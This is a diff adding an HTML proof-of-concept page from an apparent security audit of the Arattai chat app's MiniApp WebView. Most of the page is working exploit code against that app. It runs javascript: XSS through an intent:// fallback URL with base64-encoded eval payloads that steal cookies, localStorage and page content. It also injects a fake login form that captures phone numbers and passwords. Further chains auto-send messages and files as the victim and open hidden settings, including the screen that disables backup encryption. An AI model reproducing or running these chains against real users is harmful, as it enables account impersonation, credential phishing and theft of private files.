@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>ART-02: Full Impact PoC</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+* { box-sizing: border-box; }
+body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 12px; font-size: 12px; margin: 0; }
+h1 { color: #f00; font-size: 16px; margin: 0 0 4px 0; }
+h2 { color: #0ff; font-size: 13px; margin: 16px 0 6px 0; border-bottom: 1px solid #333; padding-bottom: 4px; }
+.subtitle { color: #888; font-size: 11px; margin-bottom: 12px; }
+.card { background: #111; border: 1px solid #333; padding: 10px; margin: 8px 0; border-radius: 4px; }
+.card-crit { border-color: #f00; background: #1a0000; }
+.card-high { border-color: #f80; background: #1a0f00; }
+.card-med { border-color: #ff0; background: #1a1a00; }
+.tag { display: inline-block; padding: 2px 6px; border-radius: 3px; font-size: 10px; font-weight: bold; margin-right: 4px; }
+.tag-crit { background: #f00; color: #fff; }
+.tag-high { background: #f80; color: #000; }
+.tag-med { background: #ff0; color: #000; }
+.tag-confirmed { background: #0f0; color: #000; }
+.tag-untest { background: #555; color: #fff; }
+.desc { color: #aaa; font-size: 11px; margin: 4px 0; }
+.code { color: #0ff; font-size: 10px; background: #000; padding: 4px 6px; margin: 4px 0; display: block; overflow-x: auto; white-space: nowrap; }
+button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px 12px; margin: 4px 2px; font-family: monospace; cursor: pointer; font-size: 12px; border-radius: 3px; }
+button:active { background: #0f0; color: #000; }
+.btn-fire { background: #600; border-color: #f00; color: #ff0; }
+.btn-fire:active { background: #f00; color: #fff; }
+input[type=text] { background: #000; color: #0f0; border: 1px solid #0f0; padding: 6px 8px; font-family: monospace; font-size: 12px; width: 100%; margin: 4px 0; border-radius: 3px; }
+#log { white-space: pre-wrap; background: #000; padding: 8px; border: 1px solid #333; max-height: 35vh; overflow-y: auto; margin-top: 8px; font-size: 11px; word-break: break-all; }
+#exfil { display: none; background: #001020; border: 2px solid #0ff; padding: 8px; margin-top: 8px; font-size: 11px; max-height: 25vh; overflow-y: auto; word-break: break-all; color: #0ff; }
+.sep { border-top: 2px solid #f00; margin: 16px 0; }
+</style>
+</head>
+<body>
+
+<h1>ARATTAI SECURITY AUDIT - FULL IMPACT PoC</h1>
+<div class="subtitle">MiniAppDialogFragment.kt:2155-2181 | intent:// handler without scheme/component validation</div>
+
+<!-- ============================================================ -->
+<h2>EXPLOIT 1: javascript: XSS via browser_fallback_url</h2>
+<!-- ============================================================ -->
+
+<div class="card card-crit">
+  <span class="tag tag-crit">CRITICAL</span>
+  <span class="tag tag-untest">UNCONFIRMED</span>
+  <p class="desc">Line 2165: <code>webView.loadUrl(fallbackUrl)</code> accepts <code>javascript:</code> scheme.
+  Arbitrary JS executes in current MiniApp page context. Steals cookies, localStorage, DOM.</p>
+  <span class="code">intent://x#Intent;package=com.nonexist.zzz;S.browser_fallback_url=javascript:PAYLOAD;end</span>
+
+  <button onclick="xssProof()">1a. XSS Proof (change title)</button>
+  <button class="btn-fire" onclick="xssStealAll()">1b. STEAL cookies + storage + DOM</button>
+  <button class="btn-fire" onclick="xssPhish()">1c. Inject phishing form</button>
+</div>
+
+<!-- ============================================================ -->
+<h2>EXPLOIT 2: Intent Hijack - Auto-Send Message as Victim</h2>
+<!-- ============================================================ -->
+
+<div class="card card-crit">
+  <span class="tag tag-crit">CRITICAL</span>
+  <span class="tag tag-untest">UNCONFIRMED</span>
+  <p class="desc">ChatTranscriptActivity accepts <code>user_id</code> + <code>text_message_to_send</code> extras.
+  Opens a chat and auto-sends a message. MiniApp impersonates the user.</p>
+  <p class="desc">The code has a security comment: "NEVER pass a path that originated from an untrusted intent extra"
+  — but the MiniApp intent:// handler does exactly that.</p>
+  <span class="code">intent:#Intent;component=com.aratai.chat/...ChatTranscriptActivity;S.user_id=X;S.text_message_to_send=MSG;end</span>
+
+  <div style="margin:8px 0">
+    <label style="color:#ff0">Target user_id (your own ID for safe testing):</label>
+    <input type="text" id="target_uid" placeholder="e.g. 60034506896 (enter your user ID)">
+    <label style="color:#ff0">Message to auto-send:</label>
+    <input type="text" id="auto_msg" value="[PoC] This message was sent automatically by MiniApp XSS exploit">
+  </div>
+
+  <button class="btn-fire" onclick="autoSendMessage()">2a. AUTO-SEND MESSAGE (opens chat + sends)</button>
+</div>
+
+<!-- ============================================================ -->
+<h2>EXPLOIT 3: Intent Hijack - Auto-Upload File to Chat</h2>
+<!-- ============================================================ -->
+
+<div class="card card-crit">
+  <span class="tag tag-crit">CRITICAL</span>
+  <span class="tag tag-untest">UNCONFIRMED</span>
+  <p class="desc">ChatTranscriptActivity accepts <code>file_path</code> extra. Auto-sends file as attachment
+  to specified chat — no user confirmation popup. Direct file exfiltration to attacker's chat.</p>
+  <p class="desc">Security invariant in code (line 186-189) explicitly warns against this.</p>
+  <span class="code">intent:#Intent;component=com.aratai.chat/...ChatTranscriptActivity;S.user_id=X;S.file_path=/path/to/file;end</span>
+
+  <div style="margin:8px 0">
+    <label style="color:#ff0">File path to exfiltrate:</label>
+    <input type="text" id="exfil_path" value="/sdcard/Download/miniapp_exploit.html">
+  </div>
+
+  <button class="btn-fire" onclick="autoSendFile()">3a. AUTO-SEND FILE (exfiltrate to chat)</button>
+</div>
+
+<!-- ============================================================ -->
+<h2>EXPLOIT 4: Access Internal Activities (exported=false bypass)</h2>
+<!-- ============================================================ -->
+
+<div class="card card-high">
+  <span class="tag tag-high">HIGH</span>
+  <span class="tag tag-confirmed">CONFIRMED</span>
+  <p class="desc">Intent with <code>component=</code> bypasses <code>exported=false</code> since it launches from same UID.
+  64 of 67 activities are reachable despite being marked non-exported.</p>
+
+  <button onclick="launchActivity('StorageUsageActivity')">4a. StorageUsageActivity (CONFIRMED)</button>
+  <button onclick="launchActivity('BackupSettingsActivity')">4b. BackupSettingsActivity</button>
+  <button onclick="launchActivity('ExperimentalFeaturesActivity')">4c. ExperimentalFeatures (E2EE toggle)</button>
+  <button onclick="launchActivity('DevOptionsActivity')">4d. DevOptions (info leak)</button>
+  <button onclick="launchActivity('ChangePhoneNumberActivity')">4e. ChangePhoneNumber</button>
+  <button onclick="launchBackupEncOff()">4f. BackupSettings -> disable encryption</button>
+</div>
+
+<!-- ============================================================ -->
+<h2>EXPLOIT 5: data: URI Arbitrary HTML Loading</h2>
+<!-- ============================================================ -->
+
+<div class="card card-med">
+  <span class="tag tag-med">MEDIUM</span>
+  <span class="tag tag-untest">UNCONFIRMED</span>
+  <p class="desc">data: URI loads attacker-controlled HTML in WebView with elevated settings.
+  Gets opaque origin (no same-origin to prior page), but JS bridges + settings still apply.</p>
+
+  <button onclick="testDataUri()">5a. Load attacker HTML via data: URI</button>
+</div>
+
+<div class="sep"></div>
+
+<h2>Exfiltrated Data</h2>
+<div id="exfil"></div>
+
+<h2>Exploit Log</h2>
+<button onclick="document.getElementById('log').textContent=''" style="font-size:10px;padding:4px 8px">Clear</button>
+<div id="log"></div>
+
+<script>
+var logEl = document.getElementById('log');
+var exfilEl = document.getElementById('exfil');
+window.__exfil = [];
+
+function L(cls, msg) {
+    var d = document.createElement('div');
+    d.style.color = ({success:'#0f0',fail:'#f55',info:'#ff0',critical:'#f00',data:'#0ff'})[cls] || '#0f0';
+    if (cls === 'critical') d.style.fontWeight = 'bold';
+    d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    logEl.appendChild(d);
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+window.__exfilCallback = function(label, data) {
+    window.__exfil.push({label: label, data: data, ts: new Date().toISOString()});
+    exfilEl.style.display = 'block';
+    exfilEl.textContent = JSON.stringify(window.__exfil, null, 2);
+    L('critical', 'EXFILTRATED: ' + label + ' = ' + String(data || '').substring(0, 300));
+};
+
+function intentUri(payload) {
+    return 'intent://x#Intent;package=com.definitely.nonexistent.app.zzz;S.browser_fallback_url=' + payload + ';end';
+}
+
+// ==========================================
+// EXPLOIT 1: javascript: XSS
+// ==========================================
+
+function xssProof() {
+    L('info', '=== EXPLOIT 1a: javascript: XSS Proof ===');
+    L('info', 'Before: document.title = ' + document.title);
+    var payload = 'javascript:document.title="XSS_PWNED_"+Date.now()';
+    L('info', 'Navigating to intent:// with javascript: fallback...');
+    setTimeout(function() { window.location.href = intentUri(payload); }, 300);
+    setTimeout(function() {
+        L(document.title.indexOf('XSS_PWNED') !== -1 ? 'critical' : 'info',
+          'After: document.title = ' + document.title);
+        if (document.title.indexOf('XSS_PWNED') !== -1) {
+            // Update tag to CONFIRMED
+            L('critical', 'XSS CONFIRMED! Arbitrary JS execution via browser_fallback_url');
+        }
+    }, 2000);
+}
+
+function xssStealAll() {
+    L('info', '=== EXPLOIT 1b: Cookie + Storage + DOM Theft ===');
+
+    // Seed test data to prove we can read it
+    try {
+        document.cookie = 'auth_token=SECRET_eyJhbGciOiJIUzI1NiJ9.test';
+        document.cookie = 'session_id=SESS_' + Date.now();
+        localStorage.setItem('arattai_enc_key', 'AES256_FAKE_KEY_FOR_POC_DEMO');
+        localStorage.setItem('user_profile', '{"id":"60034506896","phone":"+91XXXXXXXXXX"}');
+        L('info', 'Seeded test auth data in cookies + localStorage');
+    } catch(e) { L('fail', 'Seed failed: ' + e.message); }
+
+    // Build JS that reads everything - avoid semicolons (intent URI delimiter)
+    var code = [
+        'var c=document.cookie',
+        'var ls={}',
+        'for(var i=0,n=localStorage.length',
+        'i<n',
+        'i++){var k=localStorage.key(i)',
+        'ls[k]=localStorage.getItem(k)}',
+        'var info={',
+        'origin:location.origin,',
+        'href:location.href,',
+        'ua:navigator.userAgent,',
+        'platform:navigator.platform,',
+        'lang:navigator.language}',
+        'window.__exfilCallback("COOKIES",c)',
+        'window.__exfilCallback("LOCALSTORAGE",JSON.stringify(ls))',
+        'window.__exfilCallback("PAGE_INFO",JSON.stringify(info))',
+        'window.__exfilCallback("DOM_HTML",document.documentElement.outerHTML.substring(0,500))'
+    ].join(';\n');
+
+    var payload = "javascript:eval(atob('" + btoa(code) + "'))";
+    L('critical', 'Injecting JS to steal all client-side data...');
+    setTimeout(function() { window.location.href = intentUri(payload); }, 300);
+}
+
+function xssPhish() {
+    L('info', '=== EXPLOIT 1c: Phishing Form Injection ===');
+    L('critical', 'Replacing page with fake Arattai login form...');
+
+    var html = '<div style="font-family:-apple-system,sans-serif;max-width:380px;margin:60px auto;padding:24px">'
+        + '<div style="text-align:center;margin-bottom:24px">'
+        + '<div style="width:64px;height:64px;background:#1a73e8;border-radius:16px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center">'
+        + '<span style="color:white;font-size:28px;font-weight:bold">A</span></div>'
+        + '<h2 style="color:#222;margin:0">Arattai</h2>'
+        + '<p style="color:#666;font-size:14px;margin:8px 0">Your session has expired.<br>Please sign in again to continue.</p></div>'
+        + '<input type="tel" placeholder="Phone number" style="width:100%;padding:14px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box">'
+        + '<input type="password" placeholder="Password" style="width:100%;padding:14px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box">'
+        + '<button onclick="window.__exfilCallback(String.fromCharCode(67,82,69,68,83),document.querySelectorAll(String.fromCharCode(105,110,112,117,116))[0].value+String.fromCharCode(58)+document.querySelectorAll(String.fromCharCode(105,110,112,117,116))[1].value)" '
+        + 'style="width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:8px;font-weight:600">Sign In</button>'
+        + '<p style="color:#aaa;font-size:10px;text-align:center;margin-top:20px;font-family:monospace">'
+        + '[PoC DEMO] Phishing form injected via javascript: XSS<br>MiniAppDialogFragment.kt:2165</p></div>';
+
+    var code = 'document.body.style.background="#fff"' + ',' + 'document.body.innerHTML=' + JSON.stringify(html).replace(/;/g, '\\u003b');
+    var payload = "javascript:eval(atob('" + btoa(code) + "'))";
+    setTimeout(function() { window.location.href = intentUri(payload); }, 500);
+}
+
+// ==========================================
+// EXPLOIT 2: Auto-send message
+// ==========================================
+
+function autoSendMessage() {
+    var uid = document.getElementById('target_uid').value.trim();
+    var msg = document.getElementById('auto_msg').value.trim();
+    if (!uid) { L('fail', 'Enter a target user_id first'); return; }
+    if (!msg) { L('fail', 'Enter a message'); return; }
+
+    L('info', '=== EXPLOIT 2: Auto-Send Message as Victim ===');
+    L('info', 'Target user_id: ' + uid);
+    L('info', 'Message: ' + msg);
+    L('critical', 'Launching ChatTranscriptActivity with auto-send extras...');
+
+    var uri = 'intent:#Intent;'
+        + 'component=com.aratai.chat/com.arattai.chats.presentation.ui.ChatTranscriptActivity;'
+        + 'S.user_id=' + uid + ';'
+        + 'S.text_message_to_send=' + msg + ';'
+        + 'end';
+
+    L('info', 'URI: ' + uri);
+    setTimeout(function() { window.location.href = uri; }, 300);
+}
+
+// ==========================================
+// EXPLOIT 3: Auto-upload file
+// ==========================================
+
+function autoSendFile() {
+    var uid = document.getElementById('target_uid').value.trim();
+    var filePath = document.getElementById('exfil_path').value.trim();
+    if (!uid) { L('fail', 'Enter a target user_id first (same field as Exploit 2)'); return; }
+    if (!filePath) { L('fail', 'Enter a file path'); return; }
+
+    L('info', '=== EXPLOIT 3: Auto-Send File (Exfiltration) ===');
+    L('info', 'Target user_id: ' + uid);
+    L('info', 'File to exfiltrate: ' + filePath);
+    L('critical', 'Launching ChatTranscriptActivity with file_path extra...');
+
+    var uri = 'intent:#Intent;'
+        + 'component=com.aratai.chat/com.arattai.chats.presentation.ui.ChatTranscriptActivity;'
+        + 'S.user_id=' + uid + ';'
+        + 'S.file_path=' + filePath + ';'
+        + 'end';
+
+    L('info', 'URI: ' + uri);
+    setTimeout(function() { window.location.href = uri; }, 300);
+}
+
+// ==========================================
+// EXPLOIT 4: Internal activity access
+// ==========================================
+
+var activityMap = {
+    'StorageUsageActivity': 'com.arattai.chats.presentation.ui.StorageUsageActivity',
+    'BackupSettingsActivity': 'com.arattai.settings.chats.backup.presentation.BackupSettingsActivity',
+    'ExperimentalFeaturesActivity': 'com.arattai.settings.experimentalfeatures.ExperimentalFeaturesActivity',
+    'DevOptionsActivity': 'com.arattai.settings.developeroptions.DevOptionsActivity',
+    'ChangePhoneNumberActivity': 'com.arattai.settings.ui.activities.ChangePhoneNumberActivity'
+};
+
+function launchActivity(name) {
+    var cls = activityMap[name];
+    if (!cls) { L('fail', 'Unknown activity: ' + name); return; }
+
+    L('info', '=== EXPLOIT 4: Launch ' + name + ' ===');
+    L('info', 'Component: com.aratai.chat/' + cls);
+    L('info', 'exported=false but reachable via same-UID intent from MiniApp');
+
+    var uri = 'intent:#Intent;'
+        + 'component=com.aratai.chat/' + cls + ';'
+        + 'end';
+
+    L('success', 'Launching...');
+    setTimeout(function() { window.location.href = uri; }, 200);
+}
+
+function launchBackupEncOff() {
+    L('info', '=== EXPLOIT 4f: Navigate directly to "disable encryption" screen ===');
+    var uri = 'intent:#Intent;'
+        + 'component=com.aratai.chat/com.arattai.settings.chats.backup.presentation.BackupSettingsActivity;'
+        + 'S.initial_screen=turn_off_encryption;'
+        + 'end';
+    L('critical', 'Launching BackupSettings at turn_off_encryption screen...');
+    setTimeout(function() { window.location.href = uri; }, 200);
+}
+
+// ==========================================
+// EXPLOIT 5: data: URI
+// ==========================================
+
+function testDataUri() {
+    L('info', '=== EXPLOIT 5: data: URI Arbitrary HTML ===');
+
+    var html = '<!DOCTYPE html><html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px">'
+        + '<h1 style="color:#f00">ATTACKER-CONTROLLED PAGE</h1>'
+        + '<p>Loaded via data: URI through browser_fallback_url</p>'
+        + '<p>This HTML runs with the WebView elevated settings:</p>'
+        + '<ul><li>javaScriptEnabled = true</li>'
+        + '<li>allowFileAccess = true</li>'
+        + '<li>allowContentAccess = true</li>'
+        + '<li>MIXED_CONTENT_ALWAYS_ALLOW</li></ul>'
+        + '<p style="color:#0ff">Origin: <script>document.write(location.origin||"opaque")<\/script></p>'
+        + '<p style="color:#ff0">Timestamp: <script>document.write(new Date().toISOString())<\/script></p>'
+        + '<p style="color:#0f0">User-Agent: <script>document.write(navigator.userAgent)<\/script></p>'
+        + '</body></html>';
+
+    // data: URI with base64 to avoid semicolons
+    var payload = 'data:text/html' + String.fromCharCode(59) + 'base64,' + btoa(html);
+
+    // Need to URL-encode the data: URI since it contains characters that would confuse intent parsing
+    var uri = 'intent://x#Intent;'
+        + 'package=com.definitely.nonexistent.app.zzz;'
+        + 'S.browser_fallback_url=' + encodeURIComponent(payload) + ';'
+        + 'end';
+
+    L('success', 'Loading attacker HTML via data: URI...');
+    setTimeout(function() { window.location.href = uri; }, 500);
+}
+
+// ==========================================
+// Init
+// ==========================================
+L('info', '==========================================');
+L('info', ' ARATTAI FULL IMPACT PoC');
+L('info', ' 5 exploit chains via MiniApp WebView');
+L('info', '==========================================');
+L('info', '');
+L('info', 'Root cause: MiniAppDialogFragment.kt:2155-2181');
+L('info', '  - Intent.parseUri() without stripping component/selector');
+L('info', '  - browser_fallback_url loaded via loadUrl() with NO scheme check');
+L('info', '');
+L('info', 'Page origin: ' + (location.origin || 'null'));
+L('info', 'Page URL: ' + location.href);
+L('info', '');
+L('success', 'Ready. Run exploits in order (1a first).');
+</script>
+
+</body>
+</html>
